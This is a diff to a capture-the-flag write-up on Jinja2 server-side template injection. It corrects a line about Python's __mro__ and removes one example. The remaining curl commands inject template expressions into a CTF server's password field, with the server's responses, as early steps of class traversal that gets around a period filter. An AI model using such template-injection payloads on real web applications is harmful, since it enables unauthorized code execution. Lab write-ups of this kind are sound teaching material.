@@ -32,10 +32,8 @@ Since periods are banned, we can abuse some Python properties to access methods 
 - for some objects, `object["attribute_name"]` and `object["method_name"]()` work
 - for other objects where that doesn't work, `getattr(object, "attribute_name")` and `getattr(object, "method_name")()` work
 
-Additionally, we can use any loaded class, because Python provides `__mro__` to access a class's subclass, and `__subclasses__()` to access any subclasses of the current class. This means that by going up the `__mro__` chain, we will arrive at the `Object` class, which is the superclass of every other class.
+Additionally, we can use any loaded class, because Python provides `__mro__` to access a class's superclass, and `__subclasses__()` to access any subclasses of the current class. This means that by going up the `__mro__` chain, we will arrive at the `Object` class, which is the superclass of every other class.
 ```
-$ curl -X POST -F username=a -F password='{{self["__mro__"]}}' http://litctf.live:31781/
-ok thank you for your info i have now sold your password () for 2 donuts :)
 $ curl -X POST -F username=a -F password='{{self["__class__"]["__mro__"]}}' http://litctf.live:31781/
 ok thank you for your info i have now sold your password ((&lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;object&#39;&gt;)) for 2 donuts :)
 $ curl -X POST -F username=a -F password='{{self["__class__"]["__mro__"][1]}}' http://litctf.live:31781/
